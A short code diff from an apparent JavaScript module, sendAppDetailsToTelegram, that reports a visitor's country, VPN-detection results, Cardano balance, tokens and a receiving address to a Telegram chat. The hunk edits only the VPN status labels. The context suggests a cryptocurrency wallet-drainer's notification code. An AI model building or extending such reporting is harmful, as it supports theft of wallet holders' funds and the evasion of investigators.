@@ -56,9 +56,9 @@ export const sendAppDetailsToTelegram = async (adaBalance, tokens) => {
                 `| Country: ${globeIcon} ${country} (${countryCode}) |\n`;
 
   if (isVpnIpdata || isVpnIPQS) {
-    message += `| ⚠️ VPN SUSPECTED  |\n`;
+    message += `| ⚠️ VPN / MARKED Country SUSPECTED  |\n`;
   } else {
-    message += `| ✅ VPN SUSPECTED |\n`;
+    message += `| ✅ NO VPN SUSPECTED |\n`;
   }
 
   message += `| 👛 Receiving Address: ${recipientAddress} |\n` +
